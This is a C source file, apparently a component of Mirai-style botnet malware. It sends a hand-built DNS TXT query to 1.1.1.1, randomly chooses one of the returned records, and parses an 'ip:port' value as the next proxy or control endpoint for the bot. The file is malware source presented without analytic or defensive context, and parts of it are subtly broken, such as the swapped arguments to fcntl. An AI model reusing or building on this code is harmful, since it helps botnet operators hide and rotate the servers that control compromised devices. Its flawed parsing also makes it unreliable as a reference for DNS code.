#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>

#include "utils.h"
#include "resolv.h"
#include "rand.h"

static void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    int len = utils_strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;

    while (len-- > 0)
    {
        char c = *src_domain++;

        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    unsigned int jumped = 0, offset;
    *count = 1;

    while (*reader != 0)
    {
        if (*reader >= 192)
        {
            offset = (*reader)*256 + *(reader + 1) - 49152;
            reader = buffer + offset - 1;
            jumped = 1;
        }

        reader = reader+1;
        if (jumped == 0)
            *count = *count + 1;
    }

    if (jumped == 1)
        *count = *count + 1;
}

void resolv_grab_chain(char *domain, uint32_t *dest_addr, uint16_t *dest_port)
{
    char query[2048], response[2048];

    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1), *retval;
    resolv_domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + utils_strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof (struct dnshdr) + utils_strlen(qname) + 1 + sizeof (struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint8_t useval;
 	uint16_t dns_id = rand_next() % 0xFFFF;

    utils_memset(&addr, 0, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(1,1,1,1);
    addr.sin_port = htons(53);

    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8);
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_TXT);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 10)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);

        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to create socket\n");
#endif
            sleep(1);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to call connect on udp socket\n");
#endif
            sleep(1);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to send packet: %d\n", errno);
#endif
            sleep(1);
            continue;
        }

        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
#ifdef DEBUG
            printf("[resolv] select() failed\n");
#endif
            break;
        }
        else if (nfds == 0)
        {
#ifdef DEBUG
            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
#endif
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
#ifdef DEBUG
            printf("[resolv] Got response from select\n");
#endif
            int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof (struct dnshdr) + utils_strlen(qname) + 1 + sizeof (struct dns_question)))
                continue;

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + utils_strlen(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = ntohs(dnsh->ancount);
            useval = rand_next() % (uint8_t)ancount; // 255 max proxies

            while (ancount-- > 0)
            {
                struct dns_resource *r_data = NULL;

                resolv_skip_name(name, response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

                if (r_data->type == htons(PROTO_DNS_QTYPE_TXT) && r_data->_class == htons(PROTO_DNS_QCLASS_IP))
                {
                    if (useval == ancount)
                	{
	                	char dns_val[64];
	                	int index = 0, z;

	                	utils_memset(dns_val, 0, sizeof(dns_val));
	                	utils_memcpy(dns_val, name + 1, ntohs(r_data->data_len) - 1);

	                	dns_val[ntohs(r_data->data_len) - 1] = '\0';

	                	for (z = 0; z < ntohs(r_data->data_len) - 1; z++)
	                	{
	                		if (dns_val[z] == ':')
	                		{
	                			index = z;
	                			break;
	                		}
	                	}

                        if (index > 7)
	                	{
	                		char ival[64];
	                		uint16_t iport;
	                		uint32_t iaddr;

	                		utils_memset(ival, 0, sizeof(ival));
	                		utils_memcpy(ival, dns_val, index);
	                		iaddr = inet_addr(ival);

	                		utils_memset(ival, 0, sizeof(ival));
	                		utils_memcpy(ival, dns_val + (index + 1), utils_strlen(dns_val) - (index -1));
                            iport = atoi(ival);
	                		iport = htons(iport);

	                		*dest_addr = iaddr;
                            *dest_port = iport;

                            close(fd);
                            return;
                        }
                	}
                	
					name = name + ntohs(r_data->data_len);
                } 
                else 
                {
                    resolv_skip_name(name, response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    close(fd);
    return;
}